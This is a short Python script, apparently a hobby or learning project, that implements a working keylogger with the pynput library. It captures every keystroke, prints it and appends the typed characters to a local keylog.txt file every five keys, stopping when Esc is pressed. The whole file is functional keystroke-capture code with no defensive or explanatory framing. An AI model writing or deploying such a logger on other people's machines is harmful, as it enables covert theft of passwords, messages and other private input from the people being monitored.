import pynput

from pynput.keyboard import Key, Listener

#Updates text file after certain amount of keys
count = 0
keys = []

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

#File will update for every 5 keys logged
    if count >= 5:
        count = 0
        log_file(keys)
        keys = []

def log_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:

            #Removes random quotation marks from file
            k=str(key).replace("'","")
            #Each time user hits space key, a new line will be added to the file
            if k.find("space") > 0:
                f.write('\n')
            #Prevents special keys from being reported
            elif k.find("Key") == -1:
                f.write(k)
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

